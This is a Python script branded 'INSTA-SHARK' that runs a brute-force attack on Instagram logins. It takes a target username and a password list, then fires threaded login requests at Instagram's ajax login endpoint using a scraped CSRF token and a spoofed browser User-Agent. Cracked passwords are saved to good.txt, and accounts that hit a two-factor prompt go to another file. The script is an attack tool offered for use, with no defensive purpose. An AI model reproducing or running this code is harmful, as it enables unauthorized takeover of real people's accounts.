from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
CheckVersion = str(sys.version)
import re
from datetime import datetime



print('''

                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
IIIIIIIIIINNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS TTTTTTTTTTTTTTTTTTTTTTT         AAA                                   SSSSSSSSSSSSSSS HHHHHHHHH     HHHHHHHHH               AAA               RRRRRRRRRRRRRRRRR   KKKKKKKKK    KKKKKKK
I::::::::IN:::::::N       N::::::N SS:::::::::::::::ST:::::::::::::::::::::T        A:::A                                SS:::::::::::::::SH:::::::H     H:::::::H              A:::A              R::::::::::::::::R  K:::::::K    K:::::K
I::::::::IN::::::::N      N::::::NS:::::SSSSSS::::::ST:::::::::::::::::::::T       A:::::A                              S:::::SSSSSS::::::SH:::::::H     H:::::::H             A:::::A             R::::::RRRRRR:::::R K:::::::K    K:::::K
II::::::IIN:::::::::N     N::::::NS:::::S     SSSSSSST:::::TT:::::::TT:::::T      A:::::::A                             S:::::S     SSSSSSSHH::::::H     H::::::HH            A:::::::A            RR:::::R     R:::::RK:::::::K   K::::::K
  I::::I  N::::::::::N    N::::::NS:::::S            TTTTTT  T:::::T  TTTTTT     A:::::::::A                            S:::::S              H:::::H     H:::::H             A:::::::::A             R::::R     R:::::RKK::::::K  K:::::KKK
  I::::I  N:::::::::::N   N::::::NS:::::S                    T:::::T            A:::::A:::::A                           S:::::S              H:::::H     H:::::H            A:::::A:::::A            R::::R     R:::::R  K:::::K K:::::K   
  I::::I  N:::::::N::::N  N::::::N S::::SSSS                 T:::::T           A:::::A A:::::A                           S::::SSSS           H::::::HHHHH::::::H           A:::::A A:::::A           R::::RRRRRR:::::R   K::::::K:::::K    
  I::::I  N::::::N N::::N N::::::N  SS::::::SSSSS            T:::::T          A:::::A   A:::::A         ---------------   SS::::::SSSSS      H:::::::::::::::::H          A:::::A   A:::::A          R:::::::::::::RR    K:::::::::::K     
  I::::I  N::::::N  N::::N:::::::N    SSS::::::::SS          T:::::T         A:::::A     A:::::A        -:::::::::::::-     SSS::::::::SS    H:::::::::::::::::H         A:::::A     A:::::A         R::::RRRRRR:::::R   K:::::::::::K     
  I::::I  N::::::N   N:::::::::::N       SSSSSS::::S         T:::::T        A:::::AAAAAAAAA:::::A       ---------------        SSSSSS::::S   H::::::HHHHH::::::H        A:::::AAAAAAAAA:::::A        R::::R     R:::::R  K::::::K:::::K    
  I::::I  N::::::N    N::::::::::N            S:::::S        T:::::T       A:::::::::::::::::::::A                                  S:::::S  H:::::H     H:::::H       A:::::::::::::::::::::A       R::::R     R:::::R  K:::::K K:::::K   
  I::::I  N::::::N     N:::::::::N            S:::::S        T:::::T      A:::::AAAAAAAAAAAAA:::::A                                 S:::::S  H:::::H     H:::::H      A:::::AAAAAAAAAAAAA:::::A      R::::R     R:::::RKK::::::K  K:::::KKK
II::::::IIN::::::N      N::::::::NSSSSSSS     S:::::S      TT:::::::TT   A:::::A             A:::::A                    SSSSSSS     S:::::SHH::::::H     H::::::HH   A:::::A             A:::::A   RR:::::R     R:::::RK:::::::K   K::::::K
I::::::::IN::::::N       N:::::::NS::::::SSSSSS:::::S      T:::::::::T  A:::::A               A:::::A                   S::::::SSSSSS:::::SH:::::::H     H:::::::H  A:::::A               A:::::A  R::::::R     R:::::RK:::::::K    K:::::K
I::::::::IN::::::N        N::::::NS:::::::::::::::SS       T:::::::::T A:::::A                 A:::::A                  S:::::::::::::::SS H:::::::H     H:::::::H A:::::A                 A:::::A R::::::R     R:::::RK:::::::K    K:::::K
IIIIIIIIIINNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS         TTTTTTTTTTTAAAAAAA                   AAAAAAA                  SSSSSSSSSSSSSSS   HHHHHHHHH     HHHHHHHHHAAAAAAA                   AAAAAAARRRRRRRR     RRRRRRRKKKKKKKKK    KKKKKKK
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
                                                                           

BANGLADESH

WhatsApp :  toxicshark@protonmail.com
İnstagram : toxicshark@protonmail.com
YouTube : toxicshark@protonmail.com

           
           """""""""""""""""""""""""""""""""""""""""" 
''')


class InstaBrute(object):
    def __init__(self):

        try:
            user = input('username : ')
            Combo = input('passList : ')
            print('\n----------------------------')
          
        except:
            print(' The tool was arrested exit ')
            sys.exit()


        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
        for j in thread:
            j.join()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self,user,pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.get(link)
            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })
            print(f'{user}:{pwd}\n----------------------------')
    
            if 'authenticated": true' in r.text:
                print(('' + user + ':' + pwd + ' --> Password '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:   
                print(('' + user + ':' + pwd + ' -->  Good It has to be checked '))
                with open('results_NeedVerfiy.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')




InstaBrute()


